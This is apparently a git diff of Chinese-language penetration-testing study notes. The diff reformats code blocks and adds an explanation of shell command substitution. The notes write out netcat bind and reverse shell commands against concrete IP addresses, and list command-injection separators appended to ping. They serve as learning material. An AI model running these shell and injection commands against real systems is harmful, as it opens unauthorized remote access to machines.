@@ -261,10 +261,10 @@ CDN 会隐藏真实源 IP ，导致对目标测试错误。
 
 linux 控制 windows
 
-```
-// win 绑定cmd到其本地5566端口
+```shell
+# win 绑定cmd到其本地5566端口
 nc -e cmd -lvp 5566
-// linux 主动连接目标5566
+# linux 主动连接目标5566
 ncat 47.122.23.131 5566
 ```
 
@@ -272,10 +272,10 @@ linux 自带 nc 工具，但 win 需要下载第三方的 nc 。
 
 windows 控制 linux 也差不多：
 
-```
-// linux 绑定sh到其本地5566端口
+```shell
+# linux 绑定sh到其本地5566端口
 ncat -e /bon/sh -lvp 5566
-// win 主动连接目标5566
+# win 主动连接目标5566
 nc 47.94.236.117 5566
 ```
 
@@ -283,8 +283,8 @@ nc 47.94.236.117 5566
 
 主动给出控制权，让对方监听
 
-```
-//linux 绑定 sh 到目标 5566 后等待 5566 连接
+```shell
+# linux 绑定 sh 到目标 5566 后等待 5566 连接
 ncat -e /bin/sh 47.122.23.131 5566
 nc -lvp 5566
 ```
@@ -299,12 +299,18 @@ nc -lvp 5566
 
 （`ping` 用于测试两台网络设备之间的连通性，也可以用于检测网络延迟（Latency）、辅助进行DNS解析等）
 
-```
+```shell
 ping 127.0.0.1 | whoami
 ping 127.0.0.1 || whoami
 ping 127.0.0.1 && whoami
 ping 127.0.0.1 & whoami
-ping `whoami`
+```
+
+*命令替换（Command Substitution，**仅适用于linux**）* ：先执行反引号（或 `$()`）内部的命令，然后用这个命令的输出来替换掉整个表达式（现代脚本更推荐使用 `$()`）。
+
+```shell
+echo "Hello, `whoami`. You are currently in `pwd`." 
+# Hello, alex. You are currently in /home/alex/documents.
 ```
 
 # 相关术语
